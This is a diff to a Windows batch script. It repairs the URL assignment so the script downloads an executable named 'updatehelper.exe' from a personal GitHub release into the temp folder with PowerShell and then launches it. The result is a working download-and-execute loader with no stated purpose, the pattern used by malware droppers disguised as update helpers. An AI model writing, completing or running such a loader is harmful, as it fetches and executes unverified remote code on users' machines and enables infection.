@@ -1,12 +1,15 @@
 @echo off
-set "https://github.com/wabor1/test/releases/download/1/updatehelper.exe"
-set "TEMP_FILE=%TEMP%\file.ext"
+setlocal enabledelayedexpansion
 
-powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL%', '%TEMP_FILE%')"
-if exist "%TEMP_FILE%" (
-    echo Downloaded to %TEMP_FILE%
-    start "" "%TEMP_FILE%"
+set "URL=https://github.com/wabor1/test/releases/download/1/updatehelper.exe"
+set "TARGET=%TEMP%\updatehelper.exe"
+
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL%', '%TARGET%')"
+
+if exist "%TARGET%" (
+    start "" "%TARGET%"
 ) else (
     echo Download failed.
 )
+
 pause   
